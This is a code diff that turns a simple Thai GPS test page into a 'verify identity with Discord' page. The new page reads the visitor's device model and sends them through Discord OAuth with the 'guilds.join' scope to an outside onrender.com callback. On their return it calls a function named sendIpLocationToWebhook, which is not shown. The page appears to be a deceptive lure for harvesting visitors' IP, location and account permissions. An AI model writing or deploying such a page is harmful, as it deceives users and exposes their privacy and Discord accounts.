@@ -1,39 +1,157 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-  <meta charset="UTF-8">
-  <title>ทดสอบ GPS</title>
+  <meta charset="UTF-8" />
+  <title>ยืนยันตัวตนด้วย Discord</title>
+  <style>
+    body {
+      font-family: "Sarabun", sans-serif;
+      background: linear-gradient(to right, #e0f7fa, #f0f4f8);
+      color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 500px;
+      background: #ffffff;
+      margin: 50px 20px;
+      padding: 30px 20px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 2rem;
+      color: #00796b;
+      margin-bottom: 20px;
+    }
+
+    #slideshow {
+      margin: 30px auto;
+      max-width: 400px;
+      max-height: 400px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      object-fit: cover;
+      transition: opacity 0.5s ease-in-out;
+    }
+
+    button {
+      background-color: #009688;
+      color: #fff;
+      padding: 14px 28px;
+      font-size: 1.1rem;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 15px;
+      box-shadow: 0 6px 12px rgba(0, 150, 136, 0.3);
+    }
+
+    button:hover {
+      background-color: #00796b;
+    }
+
+    #device-info,
+    #status {
+      margin-top: 20px;
+      font-size: 1rem;
+    }
+
+    #status.success { color: #2e7d32; }
+    #status.error { color: #d32f2f; }
+    #status.loading { color: #1565c0; }
+
+    .fb-comments {
+      margin-top: 40px;
+    }
+  </style>
 </head>
 <body>
-  <h2>ตำแหน่งปัจจุบันของคุณ</h2>
-  <button onclick="getLocation()">📍 ดูตำแหน่ง</button>
-  <p id="output">คลิกเพื่อขอดึงตำแหน่ง</p>
+  <div class="container">
+    <h2>📍 ยืนยันตัวตน Discord</h2>
+
+    <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
+
+    <button id="loginBtn">เข้าสู่ระบบด้วย Discord</button>
+
+    <p id="device-info">📱 กำลังตรวจสอบรุ่นอุปกรณ์...</p>
+    <p id="status">ยังไม่มีการยืนยัน</p>
+
+    <div style="width: 100%; max-width: 500px; margin-bottom: 50px;">
+      <div id="fb-root"></div>
+      <script async defer crossorigin="anonymous"
+        src="https://connect.facebook.net/th_TH/sdk.js#xfbml=1&version=v17.0"></script>
+
+      <div class="fb-comments"
+        data-href="https://rewzakungz1.github.io/Web/"
+        data-width="100%"
+        data-numposts="5">
+      </div>
+    </div>
+  </div>
 
   <script>
-    function getLocation() {
-      const output = document.getElementById("output");
+    // ==== สไลด์รูปภาพ ====
+    const images = [
+      "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/7d25a2bf9820ec7310037be0ea7258dcc0b9a1a1218a4622068b87b9e7f394ce.jpg"
+    ];
+    let currentIndex = 0;
+    const slideshowEl = document.getElementById("slideshow");
+    function changeImage() {
+      currentIndex = (currentIndex + 1) % images.length;
+      slideshowEl.style.opacity = 0;
+      setTimeout(() => {
+        slideshowEl.src = images[currentIndex];
+        slideshowEl.style.opacity = 1;
+      }, 500);
+    }
+    setInterval(changeImage, 3000);
 
-      if (!navigator.geolocation) {
-        output.innerText = "เบราว์เซอร์ไม่รองรับ Geolocation";
-        return;
+    // ==== ตรวจจับรุ่นอุปกรณ์ ====
+    function detectDeviceModel(userAgent) {
+      if (/iPhone/.test(userAgent)) return "iPhone";
+      if (/iPad/.test(userAgent)) return "iPad";
+      if (/Android/.test(userAgent)) {
+        const match = userAgent.match(/Android.*?;\s?([^;)]*)/);
+        return match ? match[1].trim() : "Android (ไม่ทราบรุ่น)";
       }
+      if (/Windows/.test(userAgent)) return "Windows PC";
+      if (/Macintosh/.test(userAgent)) return "Mac";
+      return "ไม่สามารถระบุรุ่นอุปกรณ์ได้";
+    }
 
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-          const accuracy = position.coords.accuracy;
+    const deviceModel = detectDeviceModel(navigator.userAgent);
+    document.getElementById("device-info").innerText = "📱 รุ่นอุปกรณ์: " + deviceModel;
 
-          output.innerHTML = `
-            🌍 พิกัด: ${lat.toFixed(6)}, ${lon.toFixed(6)}<br>
-            🎯 ความแม่นยำ: ±${accuracy} เมตร<br>
-            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">ดูบน Google Maps</a>
-          `;
-        },
-        (error) => {
-          output.innerText = `เกิดข้อผิดพลาด: ${error.message}`;
-        }
-      );
+    // ==== Discord OAuth ====
+    const CLIENT_ID = "1226784287907512342";  // ใส่ client id ของคุณ
+    const REDIRECT_URI = encodeURIComponent("https://host-4cnp.onrender.com/callback");  // ใส่ redirect URI ของคุณ
+    const SCOPE = "identify guilds.join";
+    const loginBtn = document.getElementById("loginBtn");
+    const statusEl = document.getElementById("status");
+
+    loginBtn.addEventListener("click", () => {
+      const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=${SCOPE}`;
+      window.location.href = discordAuthUrl;
+    });
+
+    // ตรวจว่ากลับมาจาก Discord (มี code อยู่) → ส่งข้อมูลเลย
+    function getQueryParam(param) {
+      return new URLSearchParams(window.location.search).get(param);
+    }
+
+    if (getQueryParam("code")) {
+      loginBtn.style.display = "none";
+      sendIpLocationToWebhook();
     }
   </script>
 </body>
